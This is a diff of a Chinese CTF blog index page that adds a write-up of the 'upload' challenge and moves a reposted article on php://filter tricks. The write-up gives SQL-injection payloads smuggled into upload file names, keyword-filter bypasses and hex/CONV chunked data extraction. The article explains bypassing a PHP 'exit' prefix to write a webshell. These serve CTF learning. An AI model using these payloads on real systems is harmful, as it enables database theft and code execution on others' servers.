@@ -995,7 +995,69 @@
 <blockquote>
 <p>所以本题应该是采用 黑名单 + 检测文件内容&lt;?php 的方式</p>
 </blockquote>
-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>进入题目后需要先注册，然后拿着注册的用户去登录，进入到上传页面。刚开始尝试了<code>php</code>、<code>png</code>、<code>gif</code>都提示：<code>Incorrect file extension!</code>，最后发现只有<code>jpg</code>后缀可以上传，上传成功之后，会显示我们上传的所有文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png" alt="7-1"></p>
+<p>没有思路，看了别人的WriteUp才知道是<code>文件名注入</code></p>
+<p>我们上传文件，页面将我们上传的文件名返回，应该是查询了数据库。首先验证对参数的拼接，上传三个文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&quot; or 1=1 --+.jpg</span><br><span class="line">s&apos; or 1=1 --+.jpg</span><br><span class="line">s or 1=1 --+.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png" alt="7-2"></p>
+<p>其中只有带<code>单引号</code>的没有返回，说明发生了构造，查询结果出乎服务器的预料。确认是单引号之后，就可以开始测试注语句</p>
+<blockquote>
+<p>测试的时候发现，必须要用 加号（+） 连接前后，如下：</p>
+<p>s’+(要执行的语句)+’</p>
+<p>除了要执行的语句以外，前后两部分是为了闭合单引号，也必须要用 加号 连接，否则语句会出错，导致无法回显内容</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(select database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png" alt="7-3"></p>
+<p><code>select</code>被过滤掉了，尝试双写绕过成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seselectlect database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png" alt="7-4"></p>
+<p>但是会发现返回的结果为<code>0</code>，后来发现<code>select database()</code>的结果被系统设置为0</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png" alt="7-5"></p>
+<p>执行常规注入表名的语句返回结果也是0，并且发现<code>from</code>也被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>怀疑是否对返回的结果进行过滤（即检测为英文字母就过滤掉并返回0），所以尝试将返回结果进行转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png" alt="7-6"></p>
+<p>果然将结果处理为十六进制就能返回，将<code>十六进制转换为ASCII</code>，得到<code>web</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;7765625&quot;</span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">ascii_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,len(s),2):</span><br><span class="line">	if(len(s[i:i+2])==2):</span><br><span class="line">		hex_list.append(s[i:i+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出web</span><br></pre></td></tr></table></figure>
+<p>得到数据库名称之后，注表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了</p>
+<p>试着将结果在转换为十进制（使用CONV()函数）</p>
+<blockquote>
+<p>CONV()函数用法：</p>
+<p>CONV(要转换的字符串，要转换的进制，转换后的进制)</p>
+</blockquote>
+<p>还是继续拿注数据库的语句进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(hex(database()),16,10))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>发现返回一个科学计数法的数字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png" alt="7-7"></p>
+<p>想了一下，觉得是因为<code>数据库名</code>转换为<code>十六进制</code>对应的是两位两位（比如 web -&gt; 77 65 62），而CONV函数将十六进制整串转化为<code>十进制</code>，那这个数就非常大并且只能用科学技术法标识。想到了一个解决办法：<code>将十六进制的内容分段传给CONV函数能以十进制正常返回的范围</code>，这时候就需要借用到<code>substr()</code>函数，后来尝试最大只能是<code>12</code>位，开始注入：</p>
+<p><strong>注数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 131277325825392</span><br></pre></td></tr></table></figure>
+<p>果然回显成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png" alt="7-8"></p>
+<p>第二部分（返回没有第一次长，应该是结束了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 1819238756</span><br></pre></td></tr></table></figure>
+<p>将两次返回的结果分别转换为ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = [131277325825392,1819238756]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出 web_upload</span><br></pre></td></tr></table></figure>
+<p><strong>注表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112602976187180</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 114784820031327</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112615676665705</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 126853610566245</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 48848364724837</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 29299</span><br></pre></td></tr></table></figure>
+<p>转换为 ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(flag)		#输出 files,hello_flag_is_here,members</span><br></pre></td></tr></table></figure>
+<p><strong>注列名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 115858377367398</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 7102823</span><br></pre></td></tr></table></figure>
+<p>使用如上代码，转换为 ASCII 结果为 <code>i_am_flag</code></p>
+<p><strong>注数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 36427215695199</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 92806431727430</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 560750951</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png" alt="7-9"></p>
+<p>浏览器结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png" alt="7-10"></p>
+<p>转换为 ASCII 结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png" alt="7-11"></p>
+<p>拿到flag，直接提交不用加外套</p>
+<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>
       
 
       
@@ -1384,116 +1446,6 @@
 
 
   
-    <article id="post-转载 谈一谈php之filter的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/" class="archive-article-date">
-  	<time datetime="2019-08-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
-<p><code>php://filter</code>是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
-<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错</p>
-<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter</p>
-<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-1.png" alt="1-1"></p>
-<p>访问并<code>POST</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-2.png" alt="1-2"></p>
-<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-3.png" alt="1-3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-4.png" alt="1-4"></p>
-<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
-<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
-<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
-<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
-<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
-<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
-<p>最后效果是 ：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-5.png" alt="1-5"></p>
-<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
-<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
-<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
-<p>编写如下测试代码即可查看 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&apos;php://filter/read=string.strip_tags/resource=php://input&apos;);</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-6.png" alt="1-6"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-7.png" alt="1-7"></p>
-<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
-<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
-<p>最终的数据包如下：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-8.png" alt="1-8"></p>
-<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-9.png" alt="1-9"></p>
-<p>当然，这个方法的条件就是不开启短标签</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Python — PyQt5库的初次应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1610,6 +1562,116 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/Python — PyQt5库的初次应用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-转载 谈一谈php之filter的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/" class="archive-article-date">
+  	<time datetime="2019-08-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><code>php://filter</code>是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
+<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错</p>
+<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter</p>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-1.png" alt="1-1"></p>
+<p>访问并<code>POST</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-2.png" alt="1-2"></p>
+<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-3.png" alt="1-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-4.png" alt="1-4"></p>
+<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
+<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
